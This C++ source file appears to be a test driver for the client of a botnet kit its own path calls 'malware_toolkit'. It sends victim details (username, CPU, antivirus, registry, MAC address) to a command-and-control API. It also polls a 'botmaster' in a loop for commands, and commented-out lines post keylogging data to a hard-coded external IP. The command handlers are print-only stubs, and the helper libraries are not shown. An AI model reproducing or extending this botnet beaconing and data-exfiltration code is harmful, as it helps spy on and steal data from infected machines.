#include <iostream>
#include <stdio.h>
#include <windows.h>
#include <string>
#include <vector>
#include "HttpLib.h"
#include "UtilLib.h"

#define size(a) sizeof(a)/sizeof(a[0])

using namespace std;

int main(int argc, char *argv[])
{
	string url = "localhost";
	string api = "/malware_toolkit/api/test/";
	vector<string> keys = { "bot_id", "username", "cpu", "antivirus", "registry", "data", "mac_address" };
	vector<string> values = { "1234567890234560", "mark", "lol", "antivirus", "registry", "testytest", "33-33-33-33-33-33" };
	vector<vector<string>> requestQueue;
	char* query = NULL;
	char* response = NULL;
	vector<string> params;

	string data = "Data";

	//UPDATE LISTS
	//insertOrUpdate(keys, values, "mark", "says hi");
	//cout << keys[7] << endl;
	//cout << values[7] << endl;
	//insertOrUpdate(keys, values, "mark", "says bye");
	//cout << keys[7] << endl;
	//cout << values[7] << endl;

	//DUMP DATA AFTER POST
	//dumpData(keys, values);
	//cout << keys[0] << endl;
	//cout << values[0] << endl;
	//cout << keys[1] << endl;
	//cout << values[1] << endl;
	//cout << keys[2] << endl;
	//cout << values[2] << endl;

	//GENERAL POST REQUEST
	//USE THIS
	sendP_Request(requestQueue, keys, values, "/database/api/handler/");

	return 0;

	//sendP_Request(requestQueue, keys, values, { "mac_address", "bot_id", "data" }, "/database/api/add_keylogging/");

	return 0;

	//CONNECT IN STRUCTURE
	//GET for connect_in [mac_address, bot_id, os]
	while (true){
		cout << "are there any incopleted requests, do them now" << endl;
		Sleep(5000);
		cout << "sending connect_in to botmaster" << endl;
		response = sendG_Request(requestQueue, keys, values, { "mac_address", "bot_id" }, "/database/api/connect_in/");
		cout << "got the repsonse" << response << endl;
		if (strcmp(response, "Hi")==0){
			cout << "Perofmring the Hi action" << endl;
		}
		else if (strcmp(response, "Hi2")==0){
			cout << "Performing the Hi2 action" << endl;
		}
		else if (strcmp(response, "Bye")==0){
			cout << "Performing the bye action" << endl;
		}
		else{
			cout << "Not sure what to do" << endl;
		}

		Sleep(5000);
	}


	delete[] response;

	return 0;

	//SPECIFIC POST CASES TO ONE API AT A TIME
	//NOT REALLY IN USE ANYMORE
	//Post for add_os [mac_address, bot_id, os]
	//sendP_Request(requestQueue, keys, values, { "mac_address", "bot_id", "os" }, "/database/api/add_os/");

	//Post for add_cpu [mac_address, bot_id, cpu]
	//sendP_Request(requestQueue, keys, values, { "mac_address", "bot_id", "cpu" }, "/database/api/add_cpu/");

	//Post for add_antivirus [mac_address, bot_id, antivirus]
	//sendP_Request(requestQueue, keys, values, { "mac_address", "bot_id", "antivirus" }, "/database/api/add_antivirus/");

	//Post for add_registry [mac_address, bot_id, registry]
	//sendP_Request(requestQueue, keys, values, { "mac_address", "bot_id", "registry" }, "/database/api/add_registry/");

	//Post for add_antivirus [mac_address, bot_id, antivirus]
	//sendP_Request(requestQueue, keys, values, { "mac_address", "bot_id", "antivirus" }, "/database/api/add_antivirus/");

	//Post for add_username [mac_address, bot_id, username]
	//sendP_Request(requestQueue, keys, values, { "mac_address", "bot_id", "username" }, "/database/api/add_username/");

	return 0;

	//this one needs work
	//Post for add_keylogging [mac_address, bot_id, keylogging]
	//char* postRes = httpPostRequest("70.61.16.8", "/database/api/add_keylogging/", 50000, query);
	//cout << postRes << endl;
	//delete[] postRes;

	//delete[] query;

	//system("pause");
	return 0;
}
